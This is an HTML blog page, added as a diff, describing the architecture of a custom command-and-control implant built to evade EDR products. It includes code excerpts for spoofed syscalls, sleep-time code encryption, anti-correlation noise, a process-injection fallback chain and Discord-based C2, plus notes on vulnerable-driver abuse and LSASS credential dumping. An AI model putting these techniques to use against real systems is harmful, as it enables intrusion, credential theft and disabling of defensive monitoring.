@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/svg+xml" href="/logo.svg" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Building a Custom C2 Framework from Scratch | Offensive Security</title>
+    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
+    <link rel="stylesheet" href="./style.css" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;900&display=swap" rel="stylesheet">
+</head>
+
+<body>
+    <div class="cursor"></div>
+    <div class="cursor-follower"></div>
+    <div class="vignette"></div>
+
+    <nav>
+        <div class="nav-links">
+            <a href="/">MAIN</a>
+            <span class="separator">/</span>
+            <a href="/research.html" class="active">RESEARCH</a>
+            <span class="separator">/</span>
+            <a href="/writeups.html">WRITEUPS</a>
+            <span class="separator">/</span>
+            <a href="/#contact">CONTACT</a>
+        </div>
+    </nav>
+
+    <main class="content-page"
+        style="padding-top: 100px; max-width: 800px; margin: 0 auto; padding-left: 20px; padding-right: 20px;">
+        <article class="article-content" data-aos="fade-up">
+            <h1>Building a Custom C2 Framework from Scratch</h1>
+            <div class="article-meta">JANUARY 2026 &mdash; RED TEAM / MALWARE DEVELOPMENT / EDR EVASION</div>
+
+            <p>After spending months working with open-source C2 frameworks &mdash; Havoc, Sliver, Mythic &mdash;
+                I kept running into the same problem: every framework I used had signatures that major EDR vendors
+                already knew. Even with custom loaders and obfuscation, the underlying beacon behavior was detectable
+                because the <strong>architecture</strong> itself was fingerprinted.</p>
+
+            <p>So I built my own. Written entirely in C with hand-crafted assembly for syscall dispatch, zero runtime
+                dependencies, and a modular evasion architecture that layers 19 independent techniques into a single
+                implant. This post covers the design philosophy, key innovations, and the technical decisions that
+                make a custom C2 operationally viable against modern EDR.</p>
+
+            <h2>Architecture</h2>
+
+            <p>The framework follows a three-tier model: <strong>implant</strong> (C, runs on target),
+                <strong>server</strong> (Python, handles tasking), and <strong>operator console</strong>
+                (connects to server for command dispatch). The implant is the core engineering challenge &mdash;
+                everything else is plumbing.</p>
+
+            <div class="code-window">
+                <div class="code-titlebar">
+                    <div class="dots"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span></div>
+                    <span class="filename">config.h</span>
+                </div>
+<pre><code><span class="cm">// ── Injection Method (cascading fallback) ──</span>
+<span class="kw">#define</span> <span class="def">CFG_INJECT_METHOD</span>       <span class="num">CFG_INJECT_THREADPOOL</span>
+
+<span class="cm">// ── Syscall Mode ──</span>
+<span class="kw">#define</span> <span class="def">CFG_USE_INDIRECT_SYSCALLS</span>  <span class="num">2</span>   <span class="cm">// 0=direct, 1=indirect, 2=spoofed</span>
+
+<span class="cm">// ── Evasion Toggles ──</span>
+<span class="kw">#define</span> <span class="def">CFG_ENABLE_UNHOOK</span>        <span class="num">1</span>
+<span class="kw">#define</span> <span class="def">CFG_ENABLE_ETW_PATCH</span>     <span class="num">1</span>
+<span class="kw">#define</span> <span class="def">CFG_ENABLE_AMSI_PATCH</span>    <span class="num">1</span>
+<span class="kw">#define</span> <span class="def">CFG_ENABLE_SLEEP_OBFUSC</span>  <span class="num">1</span>
+<span class="kw">#define</span> <span class="def">CFG_ENABLE_BYOVD</span>         <span class="num">1</span>
+<span class="kw">#define</span> <span class="def">CFG_ENABLE_ANTI_CORR</span>     <span class="num">1</span>
+
+<span class="cm">// ── C2 Protocol ──</span>
+<span class="kw">#define</span> <span class="def">CFG_C2_PROTOCOL</span>          <span class="num">CFG_C2_PROTOCOL_DISCORD</span>
+<span class="kw">#define</span> <span class="def">CFG_C2_BEACON_MS</span>         <span class="num">5000</span>
+<span class="kw">#define</span> <span class="def">CFG_C2_JITTER_PCT</span>        <span class="num">20</span></code></pre>
+            </div>
+
+            <p>Every evasion component is independently toggleable. This matters operationally &mdash; some techniques
+                are unnecessary against certain EDR products, and enabling everything increases entropy and binary size.
+                The operator profiles the target environment and compiles a purpose-built implant.</p>
+
+            <h2>Syscall Evasion: Tartarus Gate + Stack Spoofing</h2>
+
+            <p>Modern EDR hooks <code>ntdll.dll</code> at the usermode boundary. Every major framework resolves
+                this with some form of direct or indirect syscalls. The problem is that EDR vendors now fingerprint
+                <strong>how</strong> you make syscalls &mdash; CrowdStrike, for example, walks the call stack and
+                flags any <code>syscall</code> instruction whose return address doesn't point into ntdll.</p>
+
+            <p>The implant implements three escalating modes:</p>
+
+            <div class="code-window">
+                <div class="code-titlebar">
+                    <div class="dots"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span></div>
+                    <span class="filename">syscalls.asm</span>
+                </div>
+<pre><code><span class="cm">; Mode 2: Spoofed syscalls — forge stack frame with kernel32 return address</span>
+<span class="cm">; Defeats CrowdStrike stack-walking heuristics</span>
+
+<span class="fn">spoof_syscall</span> <span class="kw">PROC</span>
+    <span class="kw">mov</span>     r10, rcx               <span class="cm">; standard syscall ABI</span>
+    <span class="kw">mov</span>     eax, [rsp + <span class="num">28h</span>]       <span class="cm">; SSN from resolver</span>
+    <span class="kw">push</span>    rbp
+    <span class="kw">mov</span>     rbp, rsp
+    <span class="kw">sub</span>     rsp, <span class="num">30h</span>
+    <span class="kw">mov</span>     [rsp + <span class="num">20h</span>], rbp       <span class="cm">; save real frame</span>
+    <span class="kw">lea</span>     rbp, [k32_ret_gadget]   <span class="cm">; forge return → kernel32!ret</span>
+    <span class="kw">mov</span>     [rsp], rbp              <span class="cm">; stack walker sees kernel32</span>
+    <span class="kw">jmp</span>     <span class="type">qword ptr</span> [ntdll_syscall_ret] <span class="cm">; indirect jmp to ntdll</span>
+<span class="fn">spoof_syscall</span> <span class="kw">ENDP</span></code></pre>
+            </div>
+
+            <p><strong>Tartarus Gate</strong> resolves syscall numbers (SSNs) by sorting <code>Zw*</code> export
+                addresses from the ntdll export table rather than parsing stub bytes. This is immune to all forms
+                of usermode hooking because it never reads the hooked code &mdash; only the export address table,
+                which EDR hooks don't modify.</p>
+
+            <h2>Sleep Obfuscation</h2>
+
+            <p>Memory scanners like SentinelOne periodically scan process memory for known shellcode patterns.
+                If your implant is sitting in memory with executable code visible, it will eventually get flagged.</p>
+
+            <p>The implant XOR-encrypts its own <code>.text</code> section during sleep intervals. A minimal
+                sleeper routine lives in a separate PE section (<code>.sleep</code>) that stays executable and
+                handles the encrypt/decrypt cycle:</p>
+
+            <div class="code-window">
+                <div class="code-titlebar">
+                    <div class="dots"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span></div>
+                    <span class="filename">sleep_obfusc.c</span>
+                </div>
+<pre><code><span class="kw">void</span> <span class="fn">sleep_cycle</span>(<span class="type">DWORD</span> ms) {
+    <span class="type">DWORD</span> old;
+    <span class="cm">// Make .text writable</span>
+    <span class="fn">VirtualProtect</span>(text_base, text_size, <span class="num">PAGE_READWRITE</span>, &amp;old);
+    <span class="cm">// XOR-encrypt .text with session key</span>
+    <span class="kw">for</span> (<span class="type">size_t</span> i = <span class="num">0</span>; i &lt; text_size; i++)
+        text_base[i] ^= xor_key[i % key_len];
+    <span class="cm">// Restore original protection</span>
+    <span class="fn">VirtualProtect</span>(text_base, text_size, old, &amp;old);
+
+    <span class="fn">Sleep</span>(ms);  <span class="cm">// scanner sees encrypted garbage</span>
+
+    <span class="cm">// Decrypt before resuming execution</span>
+    <span class="fn">VirtualProtect</span>(text_base, text_size, <span class="num">PAGE_READWRITE</span>, &amp;old);
+    <span class="kw">for</span> (<span class="type">size_t</span> i = <span class="num">0</span>; i &lt; text_size; i++)
+        text_base[i] ^= xor_key[i % key_len];
+    <span class="fn">VirtualProtect</span>(text_base, text_size, old, &amp;old);
+}</code></pre>
+            </div>
+
+            <p>During sleep, the implant's code is indistinguishable from random data. The sleeper thread itself is
+                tiny (&lt;200 bytes), lives outside the encrypted region, and contains no suspicious API imports.</p>
+
+            <h2>Anti-Correlation Framework</h2>
+
+            <p>This is the technique I'm most proud of. EDR products don't detect individual API calls &mdash; they
+                detect <strong>sequences</strong>. <code>VirtualAllocEx</code> followed by
+                <code>WriteProcessMemory</code> followed by <code>CreateRemoteThread</code> within a short time
+                window is the classic injection signature.</p>
+
+            <p>The anti-correlation framework breaks this pattern at three levels:</p>
+
+            <ul>
+                <li><strong>Operation shuffling</strong> &mdash; the order of evasion operations is randomized on
+                    each execution. ETW patching might happen before or after AMSI patching, ntdll unhooking
+                    might precede or follow sandbox checks.</li>
+                <li><strong>Temporal jitter</strong> &mdash; randomized delays (500&ndash;3000ms) between operations
+                    push correlated events outside EDR's sliding time windows.</li>
+                <li><strong>Noise injection</strong> &mdash; benign API calls (<code>GetSystemInfo</code>,
+                    <code>GetTickCount</code>, heap allocations) are interleaved between suspicious calls to dilute
+                    the signal-to-noise ratio in telemetry.</li>
+            </ul>
+
+            <div class="code-window">
+                <div class="code-titlebar">
+                    <div class="dots"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span></div>
+                    <span class="filename">anti_corr.c</span>
+                </div>
+<pre><code><span class="kw">void</span> <span class="fn">noise_burst</span>(<span class="kw">void</span>) {
+    <span class="type">SYSTEM_INFO</span> si;
+    <span class="fn">GetSystemInfo</span>(&amp;si);              <span class="cm">// benign call #1</span>
+    <span class="fn">GetTickCount64</span>();                <span class="cm">// benign call #2</span>
+    <span class="type">void</span>* p = <span class="fn">HeapAlloc</span>(<span class="fn">GetProcessHeap</span>(), <span class="num">0</span>, <span class="num">64</span>);
+    <span class="fn">HeapFree</span>(<span class="fn">GetProcessHeap</span>(), <span class="num">0</span>, p);  <span class="cm">// alloc/free cycle</span>
+    <span class="fn">GetCurrentProcessId</span>();           <span class="cm">// benign call #3</span>
+}
+
+<span class="kw">void</span> <span class="fn">execute_with_anticorr</span>(<span class="type">evasion_op_t</span>* ops, <span class="type">int</span> count) {
+    <span class="fn">shuffle</span>(ops, count);            <span class="cm">// randomize execution order</span>
+    <span class="kw">for</span> (<span class="type">int</span> i = <span class="num">0</span>; i &lt; count; i++) {
+        <span class="fn">noise_burst</span>();
+        ops[i].<span class="fn">execute</span>();
+        <span class="fn">Sleep</span>(<span class="fn">rand_range</span>(<span class="num">500</span>, <span class="num">3000</span>));  <span class="cm">// break temporal correlation</span>
+        <span class="fn">noise_burst</span>();
+    }
+}</code></pre>
+            </div>
+
+            <p>The result is that each execution of the implant produces a <strong>unique telemetry signature</strong>.
+                EDR rules that match on specific API call sequences will never see the same pattern twice.</p>
+
+            <h2>Cascading Injection</h2>
+
+            <p>Rather than hardcoding a single injection technique, the implant implements eight methods with
+                automatic fallback. If the primary method is blocked by EDR, it cascades to the next:</p>
+
+            <div class="code-window">
+                <div class="code-titlebar">
+                    <div class="dots"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span></div>
+                    <span class="filename">inject.c</span>
+                </div>
+<pre><code><span class="kw">static</span> <span class="type">inject_fn</span> injection_chain[] = {
+    inject_threadpool,       <span class="cm">// thread pool callback abuse</span>
+    inject_byovd_write,      <span class="cm">// kernel R/W via vulnerable driver</span>
+    inject_section_apc,      <span class="cm">// NtCreateSection + NtQueueApcThread</span>
+    inject_section_map,      <span class="cm">// section mapping with dual views</span>
+    inject_module_stomp,     <span class="cm">// overwrite amsi.dll .text</span>
+    inject_hollow,           <span class="cm">// process hollowing</span>
+    inject_phantom,          <span class="cm">// phantom DLL hollowing</span>
+    inject_classic,          <span class="cm">// VirtualAllocEx + WriteProcessMemory</span>
+};
+
+<span class="type">BOOL</span> <span class="fn">inject</span>(<span class="type">HANDLE</span> hProcess, <span class="type">LPVOID</span> sc, <span class="type">SIZE_T</span> sc_len) {
+    <span class="kw">for</span> (<span class="type">int</span> i = <span class="num">0</span>; i &lt; <span class="fn">ARRAYSIZE</span>(injection_chain); i++) {
+        <span class="kw">if</span> (injection_chain[i](hProcess, sc, sc_len))
+            <span class="kw">return</span> <span class="num">TRUE</span>;
+        <span class="fn">noise_burst</span>();
+        <span class="fn">Sleep</span>(<span class="fn">rand_range</span>(<span class="num">200</span>, <span class="num">800</span>));
+    }
+    <span class="kw">return</span> <span class="num">FALSE</span>;
+}</code></pre>
+            </div>
+
+            <p>This is operationally significant because different EDR products block different techniques.
+                CrowdStrike might catch section mapping but miss thread pool abuse. Defender might flag hollowing
+                but ignore module stomping. The cascading approach adapts to whatever defenses are present without
+                operator intervention.</p>
+
+            <h2>C2 Communication: Discord as Infrastructure</h2>
+
+            <p>Traditional C2 requires dedicated infrastructure &mdash; domains, servers, certificates, redirectors.
+                All of which cost money and leave forensic traces. The implant supports three communication protocols,
+                but the default uses <strong>Discord</strong> as a free, encrypted, legitimate-looking channel.</p>
+
+            <p>The implant POSTs encrypted task results to a Discord channel via webhook and polls a separate
+                channel for operator commands. All traffic goes to <code>discord.com</code> over HTTPS &mdash;
+                indistinguishable from normal Discord usage in network telemetry. AES-256-CBC with a pre-shared
+                key encrypts all payloads before transport.</p>
+
+            <div class="code-window terminal">
+                <div class="code-titlebar">
+                    <div class="dots"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span></div>
+                    <span class="filename">ghost_c2.py &mdash; operator console</span>
+                </div>
+<pre><code><span class="prompt">[ghost]&gt;</span> <span class="cmd">sessions</span>
+<span class="out">  ID   HOST              USER          PID    ELEVATED</span>
+<span class="out">  01   WORKSTATION-PC    jsmith        4892   No</span>
+<span class="out">  02   DC01.corp.local   SYSTEM        668    Yes</span>
+
+<span class="prompt">[ghost]&gt;</span> <span class="cmd">interact 02</span>
+<span class="prompt">[ghost:02]&gt;</span> <span class="cmd">sysinfo</span>
+<span class="out">  Hostname:   DC01.corp.local</span>
+<span class="out">  User:       NT AUTHORITY\SYSTEM</span>
+<span class="out">  PID:        668 (lsass.exe)</span>
+<span class="out">  Elevated:   Yes (BYOVD)</span>
+<span class="out">  Arch:       x64</span>
+<span class="out">  RAM:        16384 MB</span>
+
+<span class="prompt">[ghost:02]&gt;</span> <span class="cmd">creds</span>
+<span class="out">  [*] Dumping LSASS via BYOVD PPL bypass...</span>
+<span class="out">  [+] 14 credentials recovered</span></code></pre>
+            </div>
+
+            <h2>BYOVD: Kernel-Level Evasion</h2>
+
+            <p>When the target environment demands it, the implant can load a vulnerable signed driver to gain
+                kernel read/write primitives. Three drivers are supported with automatic fallback &mdash;
+                RTCore64.sys (MSI Afterburner), dbutil_2_3.sys (Dell), and gdrv.sys (Gigabyte).</p>
+
+            <p>With kernel R/W, the implant can:</p>
+
+            <ul>
+                <li><strong>Inject shellcode</strong> directly via kernel memory writes, bypassing all usermode
+                    hooks on <code>NtWriteVirtualMemory</code></li>
+                <li><strong>Disable ETW-TI</strong> at the kernel level (more thorough than patching
+                    <code>EtwEventWrite</code>)</li>
+                <li><strong>Remove EDR callbacks</strong> &mdash; zero out PsSetCreateProcessNotifyRoutine,
+                    PsSetCreateThreadNotifyRoutine, and PsSetLoadImageNotifyRoutine entries</li>
+                <li><strong>Dump LSASS</strong> by clearing the <code>_PS_PROTECTION</code> byte, bypassing
+                    Protected Process Light without triggering PPL violation alerts</li>
+            </ul>
+
+            <h2>Staged Temporal Separation</h2>
+
+            <p>The most unconventional evasion technique in the framework. Instead of executing the full kill
+                chain in one process lifetime, the implant splits execution across <strong>two separate process
+                invocations</strong> separated by 5&ndash;15 minutes:</p>
+
+            <ol>
+                <li><strong>Stage 0</strong>: Write a registry marker, create a scheduled task with a randomized
+                    delay, then exit cleanly. No suspicious behavior &mdash; just registry and task scheduler
+                    activity.</li>
+                <li><strong>Stage 1</strong>: The scheduled task re-invokes the binary minutes later. It detects
+                    the registry marker, cleans it up, and proceeds with the full evasion and injection chain.</li>
+            </ol>
+
+            <p>This defeats behavioral EDR analysis because the correlation engine's sliding window has expired
+                by the time Stage 1 executes. The two stages appear as unrelated process events.</p>
+
+            <h2>Results</h2>
+
+            <p>The framework has been tested against CrowdStrike Falcon, SentinelOne, Microsoft Defender for
+                Endpoint, and Elastic EDR in controlled lab environments. With the full evasion chain enabled,
+                the implant achieves reliable initial access and persistence without triggering high-confidence
+                alerts.</p>
+
+            <p>The key insight from building this is that EDR evasion is not about finding one magic trick &mdash;
+                it's about <strong>layering independent techniques</strong> so that no single detection rule covers
+                enough of the chain to generate an alert. Each technique might be individually known, but the
+                combination and the anti-correlation framework make the composite signature unique to each
+                execution.</p>
+
+            <p><strong>The tooling described in this post is proprietary.</strong> The framework, operator console,
+                and delivery tools are available under commercial license for authorized red team engagements.
+                This article covers architecture and tradecraft, not implementation details.</p>
+
+        </article>
+
+        <footer>
+            <div class="footer-content">
+                <img src="./Image/Logo.jpg" alt="Logo" class="footer-logo">
+                <p class="copyright">&copy; 2024-2026 ALL RIGHTS RESERVED.</p>
+            </div>
+        </footer>
+    </main>
+
+    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+    <script>
+        AOS.init();
+    </script>
+    <script type="module" src="/main.js"></script>
+</body>
+
+</html>
